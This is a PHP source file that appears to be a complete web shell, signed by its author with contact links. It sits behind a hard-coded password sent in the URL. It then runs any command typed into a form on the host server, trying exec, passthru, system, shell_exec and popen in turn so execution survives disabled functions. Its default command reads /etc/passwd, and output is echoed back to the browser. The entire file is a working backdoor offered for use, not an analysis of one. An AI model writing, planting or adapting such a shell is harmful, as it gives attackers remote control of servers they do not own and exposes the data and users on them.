<?php
$a = $_SERVER['PHP_SELF'];
$sifre	= "furkansandal";
$k = @$_POST["komut"];
if(@$_GET["sifre"]!=$sifre){
	die("Please enter the password: <form action='$a' method='GET'><input type='password' name='sifre' /><input type='submit' value='Login' /></form>");
}else{
if($k!=""){
	$textteyazdirkeke = $k;
}else{
	$textteyazdirkeke = "cat /etc/passwd";
}
	echo "Contact me-> @furkansandal (
<a href='https://github.com/furkansandal'>GitHub</a>, <a href='https://instagram.com/furkansandal'>Instagram</a>) root@furkansandal.com<br><form action='$a?sifre=$sifre' method='POST'>
<input type='text' name='komut' value='$textteyazdirkeke'/><br>
<input type='submit' value='Run'/><br></form>";
if($k!=""){
	echo "$k command is successfully workup.<br><br><br>";
}
if($k == ""){
	die();
}
						function komutcalistirbaba($komut) {
                                            $sonuc = '';
                                            if (function_exists('exec')) {
                                                @exec($komut, $sonuc);
                                                $sonuc = @join("
												", $sonuc);
                                            } elseif (function_exists('passthru')) {
                                                ob_start();
                                                @passthru($komut);
                                                $sonuc = ob_get_clean();
                                            } elseif (function_exists('system')) {
                                                ob_start();
                                                @system($komut);
                                                $sonuc = ob_get_clean();
                                            } elseif (function_exists('shell_exec')) {
                                                $sonuc = shell_exec($komut);
                                            } elseif (is_resource($f = @popen($komut, "r"))) {
                                                $sonuc = "";
                                                while (!@feof($f)) $sonuc.= fread($f, 1024);
                                                pclose($f);
                                            }
                                            return $sonuc;
                                        }
echo nl2br(komutcalistirbaba($k)).'<br><br>Version 1.0, Follow on GitHub <a href="https://github.com/furkansandal"><b>@furkansandal<b></a>';
}
?>
